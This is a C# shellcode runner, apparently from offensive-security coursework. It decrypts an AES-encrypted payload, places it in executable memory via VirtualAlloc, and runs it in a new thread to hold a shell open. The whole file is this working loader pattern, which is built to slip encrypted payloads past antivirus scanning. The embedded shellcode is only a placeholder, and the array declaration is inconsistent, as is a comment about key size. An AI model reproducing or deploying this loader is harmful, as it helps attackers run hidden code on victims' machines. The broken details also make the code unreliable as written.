using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace StayAwhile
{
    class AndListen
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;

                // Keep this in mind when you view your decrypted content as the size will likely be different.
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            // Key bytes
            byte[] Says = new byte[16] {
            0xbc, 0xea, 0x3d, 0x6e, 0xfb, 0x84, 0xb9, 0xbd, 0xc5, 0x24, 0x1e, 0x12, 0x13, 0x9e, 0x39,
            0x64 };

            // IV bytes
            byte[] Try = new byte[16] {
            0xaa, 0x2d, 0xce, 0x93, 0xc3, 0xc1, 0xd5, 0xcd, 0xdd, 0x4c, 0xdb, 0x4d, 0x0b, 0xdc, 0x28,
            0x9b };

            // AES 128-bit encrypted shellcode
            byte[] Offsec = new byte[672] { 
            0xDE, 0xAD, 0xBE, 0xEF };

            // Decrypt our shellcode
            var crypto = new AndListen();
            byte[] Harder = crypto.Decrypt(Offsec, Says, Try);
            int size = Harder.Length;

            // Allocate our memory buffer
            IntPtr va = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            
            // Copy of decrypted shellcode into the buffer
            Marshal.Copy(Harder, 0, va, size);

            // Create a thread that contains our buffer
            IntPtr thread = CreateThread(IntPtr.Zero, 0, va, IntPtr.Zero, 0, IntPtr.Zero);
            
            // Ensure our thread doesn't exit until we close our shell
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
